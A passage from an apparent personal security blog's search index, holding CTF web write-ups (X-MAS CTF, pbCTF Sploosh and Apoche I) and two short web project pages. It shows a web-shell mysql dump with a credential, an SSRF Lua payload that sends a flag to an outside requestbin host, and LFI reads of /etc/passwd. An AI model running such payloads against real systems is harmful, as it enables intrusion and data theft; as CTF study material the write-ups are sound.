&#39;mellivora&#39;);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_PASSWORD&#39;, &#39;rac9138cn98ascnascud&#39;);</span><br></pre></td></tr></table></figure><p>When I checked using a web shell, I could see that the Database configuration file exists. Then, let’s connect to the DB using the mysql command.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-19%20%EC%98%A4%EC%A0%84%207.40.25.png?raw=true"><br>[+] If you know the database name, user name, and password, you can run the query as above using the -e option of the mysql command and see the result immediately.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;mysql -D mellivora -u mellivora -prac9138cn98ascnascud -e &quot;show tables;&quot;</span><br><span class="line">output &#x3D;&gt; Tables_in_mellivora categories challenges cookie_tokens countries exceptions files hints ip_log news reset_password submissions two_factor_auth user_types users</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;mysql -D mellivora -u mellivora -prac9138cn98ascnascud -e &quot;select * from challenges&quot;</span><br><span class="line">output &#x3D;&gt; </span><br><span class="line">idaddedadded_bytitlecategorydescriptionexposedavailable_fromavailable_untilflagcase_insensitiveautomarkpointsinitial_pointsminimum_pointssolve_decaysolvesnum_attempts_allowedmin_seconds_between_submissionsrelies_on</span><br><span class="line">116060783851Brutus1Everyone hates Brutus! But does Brutus hate everyone? Who knows? Or rather, who cares?! What we care about here is the flag. Nothing more.</span><br><span class="line">\n</span><br><span class="line">\nLink: [url]http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050[&#x2F;url]115846992001617235206pwngyanctf&#123;we_dont_remember_the_actual_flag_:(&#125;01500500501002050</span><br><span class="line">216060810561Hard Challenge1Now it&#39;s time for a ramp-up in difficulty. You thought Brutus was hard? Ha! Check this one out then, punk.</span><br><span class="line">\n</span><br><span class="line">\nLink: [url]http:&#x2F;&#x2F;challs.xmas.htsp.ro:3051[&#x2F;url]115846992001617235206X-MAS&#123;Brutus_why_d1d_y0u_h4v3_t0_h4v3_RCE_113c41afe0&#125;01500500501000050</span><br><span class="line">316060811361Hello World!2Welcome to PWNgyan CTF 2020!</span><br><span class="line">\n</span><br><span class="line">\n[b]pwngyanctf&#123;H3ll0_H4ckerz_3141cc5f&#125;[&#x2F;b]115846992001617235206pwngyanctf&#123;H3ll0_H4ckerz_3141cc5f&#125;0110101013050</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>When I ran through the database using the mysql command, there was a flag of the table called challenges.</p><p><code>FLAG : X-MAS&#123;Brutus_why_d1d_y0u_h4v3_t0_h4v3_RCE_113c41afe0&#125;</code></p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blind Command Injection </tag>
            
            <tag> Hash Length Extension Attack </tag>
            
            <tag> XSS </tag>
            
            <tag> PHP Object Injection </tag>
            
            <tag> Type juggling </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pbCTF 2020 Write Up</title>
      <link href="2020/12/07/2020-12-07-pb-CTF/"/>
      <url>2020/12/07/2020-12-07-pb-CTF/</url>
      
        <content type="html"><![CDATA[<p>I participated by opening the CTF this time at Perfect Blue. Let’s write Write Up only for web challenges solved by CTF.</p><hr><h3 id="Web-Sploosh"><a href="#Web-Sploosh" class="headerlink" title="(Web) Sploosh"></a>(Web) Sploosh</h3><p><strong>Challenge Author :</strong> Corb3nik<br><br><strong>Category :</strong> WEB<br><br><strong>Points :</strong> 156<br><br><strong>Solves :</strong> 5N<br></p><p>This time, we will solve a problem called Sploosh among web challenge from pbCTF.<br><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-07%20%EC%98%A4%EC%A0%84%2012.27.01.png?raw=true"><br>When you come into challenge, you can see that there is a form for entering the URL, and you can download the source code by clicking here.<br><br></p><p>Once you think about it before looking at the source code, you might be suspicious of <code>SSRF</code> because it has the ability to type in the url.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-Type: application/json&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fail</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&#123;&#125;&quot;</span>;</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">  fail();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$url</span> === <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">  fail();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="variable">$json</span> = file_get_contents(<span class="string">&quot;http://splash:8050/render.json?timeout=1&amp;url=&quot;</span> . urlencode(<span class="variable">$url</span>));</span><br><span class="line">  <span class="variable">$out</span> = <span class="keyword">array</span>(<span class="string">&quot;geometry&quot;</span> =&gt; json_decode(<span class="variable">$json</span>)-&gt;geometry);</span><br><span class="line">  <span class="keyword">echo</span> (<span class="variable">$out</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">  fail();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Let’s check the api.php source code. You can see that the url is input and the file is opened and checked with the file_get_contents() function. And you can see that the file value is output as the geometry value.<br><br><br><br>SSRF seems to be fired by the <code>file_get_contents()</code> function of api.php.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$FLAG</span> = getenv(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$remote_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$remote_ip</span> === <span class="string">&quot;172.16.0.13&quot;</span> || <span class="variable">$remote_ip</span> === <span class="string">&#x27;172.16.0.14&#x27;</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;No flag for you :)&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Let’s check the source code of flag.php. If the connection IP is <code>172.16.0.13</code> or <code>172.16.0.14</code>, you can see the flag is given.<br><br><br></p><p>And looking at the flag.php source code, you can see that the flag is only output on the internal server. So it looks like we need to put the flag in a specific variable and bring it to our private server.<br><br><br></p><p>Now I’ve searched for Sploosh to do an exploit. If you check <a href="https://splash.readthedocs.io/en/stable/scripting-tutorial.html#scripting-tutorial">Sploosh’s official homepage</a>, you find that you can create and run Lua scripts by connecting to the <code>execute</code> endpoint.<br><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-07%20%EC%98%A4%EC%A0%84%201.13.22.png?raw=true"><br>The picture above is on the official Sploosh website. Looking at the contents, you can see that the <code>execute</code> endpoint sends the RCE payload using the lua_source parameter.</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span><span class="params">(exploit, args)</span></span></span><br><span class="line">  exploit:go(<span class="string">&quot;http://172.16.0.14/flag.php&quot;</span>)</span><br><span class="line">  <span class="keyword">local</span> flag = splash:html()</span><br><span class="line">  exploit:go(<span class="string">&quot;requestbin&quot;</span> .. flag)</span><br><span class="line">  <span class="keyword">return</span> &#123;geometry=data&#125;</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>So, I wrote the SSRF + RCE payload as above using the lua script.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag = requests.get(<span class="string">&quot;http://172.16.0.14/flag.php&quot;</span>)</span><br><span class="line">requests.get(<span class="string">&quot;requestbin&quot;</span>+flag)</span><br></pre></td></tr></table></figure><p>If the exploit code is interpreted in Python, it is as above.<br><br><br></p><p>Finally, if you connect and send the exploit code above to the excute endpoint, a flag will come to requestbin. (<code>URL encoding</code>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload : http%3A%2F%2Flocalhost%3A8050%2Fexecute%3Flua_source%3Dfunction%2520main%28splash%2C%2520args%29%2520splash%3Ago%28%2522http%3A%2F%2F172.16.0.14%2Fflag.php%2522%29%2520local%2520data%2520%3D%2520splash%3Ahtml%28%29%2520splash%3Ago%28%2522https:&#x2F;&#x2F;66409bdd5f994b912d1a7f0f28d3b33f.m.pipedream.net%2F%2522%2520..%2520data%29%2520return%2520%7Bgeometry%3Ddata%7D%2520end</span><br></pre></td></tr></table></figure><p>So, I’ll URL-encode the exploit code and pass it over.<br><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-07%20%EC%98%A4%EC%A0%84%202.29.59.png?raw=true"><br>When I sent the above exploit payload, I could see the flag coming to the requestbin.</p><p><code>FLAG : pbctf&#123;1_h0p3_y0u_us3d_lua_f0r_th1s&#125;</code><br><br></p><hr><h3 id="Web-Apoche-I"><a href="#Web-Apoche-I" class="headerlink" title="(Web) Apoche I"></a>(Web) Apoche I</h3><p><strong>Challenge Author :</strong> theKidOfArcrania<br><br><strong>Category :</strong> WEB<br><br><strong>Points :</strong> 58<br><br><strong>Solves :</strong> 5N<br></p><p>This time, we will solve a challenge called Apoche I among web challenge from pbCTF.<br><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-07%20%EC%98%A4%EC%A0%84%205.19.31.png?raw=true"><br>Looking at the challenge description, there are 5 URLs given. You can connect to an open server among 5 servers. (Some servers are closed.)<br><br></p><p>And looking at the hint, it says to get information about the binary.<br><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-07%20%EC%98%A4%EC%A0%84%205.23.10.png?raw=true"><br>I connected to 34.68.159.75:41521, and when I checked the robots.txt file, I could see that there is a secret directory. I thought LFI would happen here, so I grabbed a proxy and attempted an LFI attack.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-07%20%EC%98%A4%EC%A0%84%205.27.43.png?raw=true"><br>When I grabbed the request using Burp Suite and accessed the <code>/etc/passwd</code> file, I could see that the <code>LFI</code> worked well.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-07%20%EC%98%A4%EC%A0%84%205.32.50.png?raw=true"><br>So I accessed <code>/proc/self/exe</code> to get the <code>binary file</code>, and when I searched for <code>pbctf&#123;</code>, I could see that the binary file had a flag.</p><p><code>FLAG : pbctf&#123;n0t_re4lly_apache_ap0che!&#125;</code><br><br></p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Path Traversal </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web Project (dJango)</title>
      <link href="2020/10/24/2020-10-24-Project-2/"/>
      <url>2020/10/24/2020-10-24-Project-2/</url>
      
        <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description "></a>Description <br></h1><p><strong>N0named 팀을 활동할 때, dJango Project에 참여를 했었는데 그때 로그인, 회원가입, 비밀번호 찾기, 이메일 인증, 어드민 패널, 문제 관리 페이지 개발을 맡았었습니다. 이때 처음으로 dJango 웹 프레임워크를 이용해봤는데 에러 때문에 조금 애를 먹었지만 괜찮았던 거 같습니다. 하지만 갓 프레임워크는 flask, node인 거 같네요.</strong><br></p><hr><h2 id="Things-used"><a href="#Things-used" class="headerlink" title="Things used"></a>Things used<br></h2><p>Language&nbsp;&nbsp;&nbsp;<code>HTML</code>, <code>python</code>, <code>php</code>, <code>javascript</code><br><br>Database&nbsp;&nbsp;&nbsp;&nbsp;<code>PostgreSQL</code><br><br>WF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>dJango</code><br><br>OS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>Ubuntu</code><br></p><hr><h2 id="Project-Member"><a href="#Project-Member" class="headerlink" title="Project Member"></a>Project Member<br></h2><p>(생략)<br><br><code>Jeongwon Jo</code><br><br>(생략)</p><hr><h2 id="Project-period"><a href="#Project-period" class="headerlink" title="Project period"></a>Project period<br></h2><p>undefined<br></p><hr><h2 id="Web-Service-Source-Code"><a href="#Web-Service-Source-Code" class="headerlink" title="Web Service Source Code"></a>Web Service Source Code</h2><p><a href="https://github.com/wjddnjs33/dJango_Project/tree/main/source">SOURCE</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> Project </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Project </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web Project (PHP)</title>
      <link href="2020/06/05/2020-09-16-Project-1/"/>
      <url>2020/06/05/2020-09-16-Project-1/</url>
      
        <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description "></a>Description <br></h1><p>For this project, we developed a web service, hacking the developed web service, and wrote a report.</p><hr><h2 id="Things-used"><a href="#Things-used" class="headerlink" title="Things used"></a>Things used<br></h2><p>Language&nbsp;&nbsp;&nbsp;<code>HTML, PHP, Javascript</code><br><br>Database&nbsp;&nbsp;&nbsp;&nbsp;<code>MySQL</code><br><br>Server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>Apache 2</code><br><br>OS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>Ubuntu</code><br></p><hr><h2 id="Project-Member"><a href="#Project-Member" class="headerlink" title="Project Member"></a>Project Member<br></h2><p><code>Jeongwon Jo (Captain)</code></p><hr><h2 id="Project-period"><a href="#Project-period" class="headerlink" title="Project period"></a>Project period<br></h2><p>2020.9.16 ~ 2020.9.24 (9 days)<br></p><hr><h2 id="Web-Service-Source-Code"><a href="#Web-Service-Source-Code" class="headerlink" title="Web Service Source Code"></a>Web Service Source Code</h2><p><a href="https://github.com/wjddnjs33/PHP_Project/tree/main/PHP_Project">SOURCE</a></p><hr><h2 id="Project-Report"><a href="#Project-Report" class="headerlink" title="Project Report"></a>Project Report<br></h2><p><a href="https://drive.google.com/file/d/1HHR8SHupKmN8GULlptPNFeVe7JJEUXK9/view">PDF</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> Project </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Project </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
